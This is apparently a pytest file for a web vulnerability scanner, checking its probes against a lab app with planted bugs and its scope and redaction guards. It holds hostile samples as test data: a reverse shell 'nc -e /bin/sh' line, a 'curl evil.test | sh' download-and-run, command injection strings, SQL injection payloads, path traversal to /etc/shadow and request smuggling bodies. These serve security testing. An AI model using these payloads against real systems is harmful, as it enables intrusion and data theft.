"""Probes vs the lab app: each check must see its planted bug."""
import re
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from argus.tools import probes, web


def test_fingerprint_sees_stack(lab_url, ctx):
    out = web.fingerprint(ctx, lab_url)
    assert out["status"] == 200
    assert any("LabVuln" in h for h in out["stack_hints"])
    assert "content-security-policy" in out["missing_security_headers"]
    assert out["robots"]["status"] == 200
    assert "/debug" in out["robots"]["disallow"]


def test_crawl_maps_surface(lab_url, ctx):
    out = web.crawl(ctx, lab_url, depth=1, max_pages=20)
    assert "/search" in out["endpoints"] or "/item" in out["endpoints"]
    assert any(f["action"].endswith("/search") for f in out["forms"])


def test_js_recon_finds_endpoints_and_secret(lab_url, ctx):
    out = web.js_recon(ctx, lab_url)
    eps = [e["endpoint"] for e in out["endpoints"]]
    assert any("/api/user" in e for e in eps)
    assert out["secret_candidates"]
    # deployed sourcemap is recovered and its sources scanned
    assert out["sourcemaps_found"] == 1
    assert any("/api/admin/export" in e for e in eps), eps
    sm_srcs = {e["source"] for e in out["endpoints"]}
    assert any(".map#" in s for s in sm_srcs)


def test_reflection_probe(lab_url, ctx):
    out = probes.probe_reflection(ctx, lab_url + "/search?q=x", "q")
    assert out["reflected"]
    assert "<" in out["unescaped_chars"]


def test_sqli_probe_error_based(lab_url, ctx):
    out = probes.probe_sqli(ctx, lab_url + "/item?id=1", "id")
    assert "error" in out["verdict"] or "candidate" in out["verdict"]
    assert out["error_markers"] or out["true_false_similarity"] < 0.9


def test_sqli_probe_or_pair(lab_url, ctx):
    # /stock filters with AND visible=1 so both AND arms return the same
    # empty page - only the OR '1'='1 / '1'='2 pair can differentiate
    out = probes.probe_sqli(ctx, lab_url + "/stock?sku=x", "sku")
    assert "OR pair" in out["verdict"], out


def test_sqli_probe_union_cols(lab_url, ctx):
    # items selects 2 columns; ORDER BY 3 is the first failing n
    out = probes.probe_sqli(ctx, lab_url + "/item?id=1", "id", union_cols=6)
    assert out["union"]["columns"] == 2, out["union"]
    out2 = probes.probe_sqli(ctx, lab_url + "/product?id=1", "id",
                             union_cols=6)
    assert out2["union"]["columns"] == 2, out2["union"]
    assert out2["union"]["context"] == "numeric", out2["union"]


def test_time_probe_cmd(lab_url, ctx):
    out = probes.probe_time(ctx, lab_url + "/ping?host=1", "host", delay_s=2)
    assert "cmd" in out["verdict"]


def test_ssti_probe(lab_url, ctx):
    out = probes.probe_ssti(ctx, lab_url + "/hello?name=x", "name")
    assert "ssti candidate" in out["verdict"]


def test_lfi_probe(lab_url, ctx):
    out = probes.probe_lfi(ctx, lab_url + "/download?file=x", "file")
    assert "confirmed marker" in out["verdict"]


def test_redirect_probe(lab_url, ctx):
    out = probes.probe_redirect(ctx, lab_url + "/redirect?next=/", "next")
    # client-side redirect via meta-refresh (no Location header)
    out2 = probes.probe_redirect(ctx, lab_url + "/jsredirect?next=/", "next")
    assert "client-side" in out2["verdict"], out2
    assert "open redirect" in out["verdict"]
    # raw-echo redirector also lands javascript: in Location -> DOM XSS
    assert "javascript:" in out["verdict"], out
    assert out["variants"][0].get("javascript_scheme"), out
    out3 = probes.probe_redirect(ctx, lab_url + "/safedirect?next=/", "next")
    assert "protocol-relative" in out3["verdict"], out3


def test_idor_probe(lab_url, ctx):
    out = probes.probe_idor(ctx, lab_url + "/api/user/2")
    assert "idor candidate" in out["verdict"], out


def test_idor_probe_post_body(lab_url, ctx):
    # object id lives inside the JSON body, not the URL
    out = probes.probe_idor(ctx, lab_url + "/api/order", method="POST",
                            data='{"order": 5}')
    assert "idor candidate" in out["verdict"], out


def test_idor_probe_query_id(lab_url, ctx):
    out = probes.probe_idor(ctx, lab_url + "/api/user/2?x=1")
    assert "idor candidate" in out["verdict"] or "neighbors" in out["verdict"], out


def test_ssrf_probe(lab_url, ctx):
    out = probes.probe_ssrf(ctx, lab_url + "/fetch?url=x", "url")
    assert "ssrf" in out["verdict"], out
    hits = [h for h in out["results"] if h["differs"]]
    assert hits, out


def test_xxe_probe(lab_url, ctx):
    out = probes.probe_xxe(ctx, lab_url + "/xml")
    assert "xxe candidate" in out["verdict"], out
    xi = next(r for r in out["results"] if r["name"] == "xinclude-fallback")
    assert xi["marker"], xi


def test_csrf_probe(lab_url, ctx):
    out = probes.probe_csrf(ctx, lab_url + "/login")
    assert "csrf" in out["verdict"], out
    assert out["unprotected"], out
    # JSON API processed via a CORS-simple content type = csrfable
    out2 = probes.probe_csrf(ctx, lab_url + "/api/config",
                             data="theme=light")
    assert "text/plain" in out2["verdict"], out2
    assert out2["content_type_replay"]["processed"]
    # a GET form whose action looks state-changing is a csrf lead even
    # without any POST form - browsers fire cross-origin GETs trivially
    out3 = probes.probe_csrf(ctx, lab_url + "/")
    assert "state-changing" in out3["verdict"], out3
    assert out3["stateful_get_forms"], out3


def test_enum_probe(lab_url, ctx):
    # /login answers "Unknown user" for a bogus name but "Wrong password
    # for admin" for a real one - the differential IS the enumeration
    out = probes.probe_enum(ctx, lab_url + "/login",
                            "username=x&password=x", "username")
    assert "enumeration candidate" in out["verdict"], out
    assert any(t["user"] == "admin" for t in out["results"]), out


def test_lockout_probe(lab_url, ctx):
    body = "username=x&password=x"
    out = probes.probe_lockout(ctx, lab_url + "/login2", body)
    assert "no lockout" in out["verdict"], out
    assert out["attempts"] == 10, out
    out = probes.probe_lockout(ctx, lab_url + "/login3", body)
    assert "throttling observed" in out["verdict"], out
    assert out["attempts"] < 10, out  # broke early on the 429


def test_massassign_probe(lab_url, ctx):
    out = probes.probe_massassign(
        ctx, lab_url + "/api/register",
        data='{"username":"t1","password":"x"}')
    assert "mass-assignment candidate" in out["verdict"], out
    assert "role" in out["accepted_fields"], out


def test_xfh_probe(lab_url, ctx):
    out = probes.probe_xfh(ctx, lab_url + "/reset")
    assert "host-header candidate" in out["verdict"], out
    out = probes.probe_xfh(ctx, lab_url + "/", restricted="/admin")
    assert "acl-bypass candidate" in out["verdict"], out


def test_nosqli_probe(lab_url, ctx):
    out = probes.probe_nosqli(ctx, lab_url + "/api/login",
                              '{"username":"admin","password":"x"}',
                              "password")
    assert "nosqli candidate" in out["verdict"], out
    form = next(h for h in out["results"] if h["op"] == "urlencoded[$ne]")
    assert form["differs"] and form["status"] == 200, out


def test_upload_probe(lab_url, ctx):
    out = probes.probe_upload(ctx, lab_url + "/upload")
    assert "upload candidate" in out["verdict"], out


def test_graphql_introspect(lab_url, ctx):
    from argus.tools import web
    out = web.graphql_introspect(ctx, lab_url + "/graphql")
    assert out["verdict"] == "schema introspected", out
    names = {t["name"] for t in out["types"]}
    assert "User" in names, out


def test_race_probe(lab_url, ctx):
    out = probes.probe_race(ctx, lab_url + "/redeem", n=8)
    assert "race candidate" in out["verdict"], out
    assert out["statuses"].get(200, 0) > 1, out
    # serial baseline disambiguates: a repeatable endpoint is not a race
    out2 = probes.probe_race(ctx, lab_url + "/hello", n=6)
    assert "repeatable" in out2["verdict"], out2


def test_deserialize_probe(lab_url, ctx):
    out = probes.probe_deserialize(ctx, lab_url + "/import?data=x", "data")
    assert "deserialization surface" in out["verdict"], out


def test_cache_probe(lab_url, ctx):
    out = probes.probe_cache(ctx, lab_url + "/cached")
    assert "cache-poisoning candidate" in out["verdict"], out
    out = probes.probe_cache(ctx, lab_url + "/profile")
    assert "path confusion" in out["verdict"], out
    assert out["deception"]["similarity"] > 0.9, out


def test_ppoll_probe(lab_url, ctx):
    out = probes.probe_ppoll(ctx, lab_url + "/api/config",
                             lab_url + "/api/config")
    assert "prototype-pollution candidate" in out["verdict"], out
    out = probes.probe_ppoll(ctx, lab_url + "/api/config2",
                             lab_url + "/api/config")
    assert "constructor.prototype" in out["verdict"], out


def test_cors_probe(lab_url, ctx):
    out = probes.probe_cors(ctx, lab_url + "/api/data")
    assert "credentials" in out["verdict"]


def test_jwt_weak_secret(ctx):
    import json as j
    from argus.tools.analysis import jwt_decode
    hdr = {"alg": "HS256", "typ": "JWT"}
    pay = {"sub": "a"}
    import base64, hashlib, hmac
    b = lambda o: base64.urlsafe_b64encode(j.dumps(o).encode()).decode().rstrip("=")
    h, p = b(hdr), b(pay)
    sig = base64.urlsafe_b64encode(
        hmac.new(b"secret123", f"{h}.{p}".encode(), hashlib.sha256).digest()
    ).decode().rstrip("=")
    out = jwt_decode(ctx, f"{h}.{p}.{sig}")
    assert out.get("recovered_secret") == "secret123"


def test_scope_blocks_outside(ctx):
    import pytest
    from argus.scope import ScopeError
    with pytest.raises(ScopeError):
        ctx.client.send("GET", "https://example.org/")


def test_smuggle_probe_desync(lab_url, ctx):
    out = probes.probe_smuggle(ctx, lab_url + "/desync")
    assert "cl.te desync candidate" in out["verdict"]
    assert out["statuses"] == [200, 501]


def test_smuggle_probe_tecl(lab_url, ctx):
    out = probes.probe_smuggle(ctx, lab_url + "/desync-cl")
    assert "te.cl desync candidate" in out["verdict"]
    assert out["statuses"][-1] == 501


def test_smuggle_probe_obf(lab_url, ctx):
    out = probes.probe_smuggle(ctx, lab_url + "/desync-obf")
    assert "obfuscated TE" in out["verdict"]


def test_smuggle_probe_clean(lab_url, ctx):
    out = probes.probe_smuggle(ctx, lab_url + "/desync-none")
    assert "no desync signal" in out["verdict"]


def test_disclosure_probe(lab_url, ctx):
    out = probes.probe_disclosure(ctx, lab_url)
    paths = {h["path"] for h in out["exposed"]}
    assert {"/.git/HEAD", "/.env", "/debug"} <= paths


def test_crlf_probe(lab_url, ctx):
    out = probes.probe_crlf(ctx, lab_url + "/redirect?next=/", "next")
    assert "crlf injection candidate" in out["verdict"]
    assert out["injected_header"] is True


def test_websocket_probe(lab_url, ctx):
    out = probes.probe_websocket(ctx, lab_url + "/ws")
    assert "confirmed" in out["verdict"]
    out2 = probes.probe_websocket(ctx, lab_url + "/")
    assert "no ws" in out2["verdict"]


def test_js_recon_finds_websocket(lab_url, ctx):
    from argus.tools.web import js_recon
    out = js_recon(ctx, lab_url + "/")
    assert any("ws://" in e["endpoint"] for e in out["websocket_endpoints"])


def test_send_raw_preserves_wire_text(lab_url, ctx):
    out = ctx.client.send_raw(
        lab_url + "/desync-none",
        requests=[{"method": "POST",
                   "headers": [["Content-Length", "6"],
                               ["Transfer-Encoding", "chunked"]],
                   "body": b"0\r\n\r\nG"}],
        tool="dbg")
    assert out["sends"][0]["status"] == 200
    entry = ctx.session._transcript[out["sends"][0]["request_id"]]
    text = entry["request"]["request_text"]
    assert "Content-Length: 6" in text
    assert "Transfer-Encoding: chunked" in text  # both headers survive


def test_send_raw_reads_unsolicited(lab_url, ctx):
    out = ctx.client.send_raw(
        lab_url + "/desync-cl",
        requests=[{"method": "POST", "reads": 2,
                   "headers": [["Content-Length", "4"],
                               ["Transfer-Encoding", "chunked"]],
                   "body": b"14\r\nGPOST / HTTP/1.1\r\n\r\n\r\n0\r\n\r\n"}],
        tool="dbg")
    assert [s["status"] for s in out["sends"]] == [200, 501]
    assert out["sends"][1]["solicited"] is False


def test_send_raw_scope_checked(lab_url, ctx):
    import pytest
    with pytest.raises(Exception):
        ctx.client.send_raw(
            "http://169.254.169.254/",
            requests=[{"method": "GET", "headers": [], "body": b""}],
            tool="dbg")


def test_transcript_redacts_operator_secrets(lab_url, tmp_path):
    """A recorded exchange must not persist the operator's live credential
    values - transcripts and rendered reports are shared artifacts. Header
    names stay (audit shows auth was sent); values are redacted."""
    from argus.config import Config
    from argus.scope import ScopeGuard
    from argus.ratelimit import RateLimiter
    from argus.session import Session
    from argus.httpclient import GuardedClient
    cfg = Config(target=lab_url, allow_private=True, session_dir=tmp_path)
    session = Session(tmp_path, lab_url, meta={})
    client = GuardedClient(
        ScopeGuard(lab_url, allow_private=True), session, RateLimiter(0),
        default_headers={"Authorization": "Bearer live-session-tok3n",
                         "Cookie": "sid=sekrit-value"},
        agent="t")
    out = client.send("GET", lab_url + "/", tool="t")
    client.close()
    entry = session._transcript[out["request_id"]]
    wire = entry["request"]["headers"]
    assert wire["authorization"] == "Bearer •••redacted•••"
    assert "sekrit-value" not in str(entry)
    assert "live-session-tok3n" not in str(entry)
    assert wire["cookie"].startswith("sid=")


def test_send_raw_redacts_secrets_keeps_structure(lab_url, tmp_path):
    """send_raw merges operator headers onto the wire; the recorded wire
    text must redact their values while keeping framing evidence intact."""
    from argus.config import Config
    from argus.scope import ScopeGuard
    from argus.ratelimit import RateLimiter
    from argus.session import Session
    from argus.httpclient import GuardedClient
    session = Session(tmp_path, lab_url, meta={})
    client = GuardedClient(
        ScopeGuard(lab_url, allow_private=True), session, RateLimiter(0),
        default_headers={"Authorization": "Bearer live-session-tok3n"})
    out = client.send_raw(
        lab_url + "/desync-none",
        requests=[{"method": "POST",
                   "headers": [["Content-Length", "6"],
                               ["Transfer-Encoding", "chunked"]],
                   "body": b"0\r\n\r\nG"}],
        tool="dbg")
    client.close()
    entry = session._transcript[out["sends"][0]["request_id"]]
    text = entry["request"]["request_text"]
    assert "live-session-tok3n" not in text
    assert "Authorization: •••redacted•••" in text
    assert "Transfer-Encoding: chunked" in text  # evidence untouched


# --- command injection: the lab is a real output channel, bounded -----------

def test_cmdi_probe_gets_real_command_output(lab_url, ctx):
    """The acceptance criterion for the rce class: the output of `id`."""
    out = probes.probe_cmdi(ctx, lab_url + "/ping?host=127.0.0.1", "host")
    assert "command output returned" in out["verdict"], out["verdict"]
    assert out["proof_request_id"]
    body = ctx.session.get_exchange(out["proof_request_id"])["response"]["body"]
    # identity line AND the probe nonce, both from the target
    assert re.search(r"uid=\d+\(|\\", body), body[:200]
    assert out["nonce"] in body


def test_cmdi_finding_grades_proven(lab_url, ctx):
    from argus.tools.analysis import record_finding
    out = probes.probe_cmdi(ctx, lab_url + "/ping?host=127.0.0.1", "host")
    body = ctx.session.get_exchange(out["proof_request_id"])["response"]["body"]
    ident = re.search(r"uid=\d+\([^)]*\)|[A-Za-z0-9_.-]+\\[A-Za-z0-9_.-]+",
                      body).group(0)
    res = record_finding(
        ctx, title="OS command injection in /ping host", severity="critical",
        category="rce", url=lab_url + "/ping?host=127.0.0.1",
        evidence_excerpt=ident, evidence_ids=[out["proof_request_id"]],
        description="host reaches a shell", remediation="use argv")
    assert res["grade"] == "proven", res


def test_cmdi_probe_calls_a_reflection_a_reflection(lab_url, ctx):
    """/search echoes the payload; it executes nothing. The probe must say so
    rather than report the echoed `id` as command output."""
    out = probes.probe_cmdi(ctx, lab_url + "/search?q=x", "q")
    assert "reflected, not executed" in out["verdict"], out["verdict"]
    assert "proof_request_id" not in out


def test_lab_exec_is_allowlisted_not_a_shell():
    import vulnapp
    assert "uid=" in vulnapp._lab_exec("id") or \
        "command not found" in vulnapp._lab_exec("id")      # windows CI
    assert vulnapp._lab_exec("echo hello world") == "hello world"
    for destructive in ("rm -rf /tmp/x", "nc -e /bin/sh 10.0.0.1 4444",
                        "curl http://evil.test/x | sh", "useradd bob"):
        assert "command not found" in vulnapp._lab_exec(destructive), destructive


def test_lab_cat_cannot_leave_the_fake_filesystem():
    import vulnapp
    out = vulnapp._lab_exec("cat /etc/passwd")
    assert "root:x:0:0" in out                      # the lab's own fake file
    assert "Permission denied" in vulnapp._lab_exec("cat ../../../../etc/shadow") \
        or "No such file" in vulnapp._lab_exec("cat ../../../../etc/shadow")


def test_injected_commands_splits_like_a_shell():
    import vulnapp
    assert vulnapp._injected_commands("127.0.0.1; id") == ["id"]
    assert vulnapp._injected_commands("127.0.0.1$(id)") == ["id"]
    assert vulnapp._injected_commands("127.0.0.1`id`") == ["id"]
    assert vulnapp._injected_commands('127.0.0.1"; id #') == ["id"]
    assert vulnapp._injected_commands("127.0.0.1") == []


def test_sqli_extraction_is_bounded_and_real(lab_url, ctx):
    out = probes.probe_sqli(ctx, lab_url + "/item?id=1", "id", union_cols=6,
                            extract_table="users",
                            extract_columns="username,password")
    ex = out["extract"]
    assert ex["error_marker"] is None, ex
    assert ex["changed_from_baseline"]
    body = ctx.session.get_exchange(ex["request_id"])["response"]["body"]
    assert "admin" in body and "s3cr3t" in body, body[:200]


def test_sqli_extraction_refuses_a_non_identifier(lab_url, ctx):
    out = probes.probe_sqli(ctx, lab_url + "/item?id=1", "id",
                            extract_table="users; DROP TABLE users",
                            extract_columns="username")
    assert "not a table identifier" in out["extract"]["error"]


def test_allowlisted_commands_take_no_arguments():
    """An allowlisted NAME is not a bounded command: `hostname -F <file>`
    reads a file, a bare argument sets the host name, and `id <user>`
    enumerates accounts. SECURITY.md's claim was false as written."""
    import vulnapp
    for cmd in ("hostname -F /etc/passwd", "hostname evil", "id root",
                "uname -a /etc/shadow", "pwd /root"):
        out = vulnapp._lab_exec(cmd)
        assert "extra operand" in out or "command not found" in out, (cmd, out)
    # the no-argument forms still work, which is what the rce proof needs
    assert "uid=" in vulnapp._lab_exec("id") or \
        "command not found" in vulnapp._lab_exec("id")


def test_a_path_component_is_not_an_allowlisted_name():
    """basename("./id") is "id", and shutil.which would then resolve it
    against PATH rather than against the path that was given."""
    import vulnapp
    for cmd in ("./id", "../../bin/id", "/bin/id", "sub/dir/echo hi"):
        assert "command not found" in vulnapp._lab_exec(cmd), cmd


def test_injected_segments_are_bounded():
    """A 64 KB value of `;id` was ~21,500 fork/execs on one thread."""
    import vulnapp
    many = vulnapp._injected_commands("1" + ";id" * 5000)
    assert len(many) <= vulnapp._EXEC_MAX_SEGMENTS
    # a NUL raised ValueError out of shlex and the request died with no reply
    assert vulnapp._injected_commands("1;\x00id") == ["id"]
    assert vulnapp._lab_exec("echo a\x00b") is not None


def test_cat_containment_is_not_prefix_based():
    """startswith on the directory name lets /x/fake-other through when the
    root is /x/fake, and a symlink inside the tree pointed anywhere."""
    import os
    import vulnapp
    assert "root:x:0:0" in vulnapp._lab_exec("cat /etc/passwd")
    for path in ("../../../etc/shadow", "/../etc/shadow",
                 "..%2f..%2fetc%2fshadow"):
        out = vulnapp._lab_exec(f"cat {path}")
        assert "Permission denied" in out or "No such file" in out, (path, out)
    sibling = os.path.realpath(vulnapp.FAKEFS) + "-other"
    assert not os.path.realpath(
        os.path.join(vulnapp.FAKEFS, "x")).startswith(sibling)


def test_external_tools_do_not_inherit_stdin():
    """Under `argus mcp-serve` the agent's stdin IS the host's JSON-RPC
    channel; a tool that reads it consumes the host's frames."""
    import inspect
    from argus.tools import _subproc
    src = inspect.getsource(_subproc)
    assert "stdin=subprocess.DEVNULL" in src
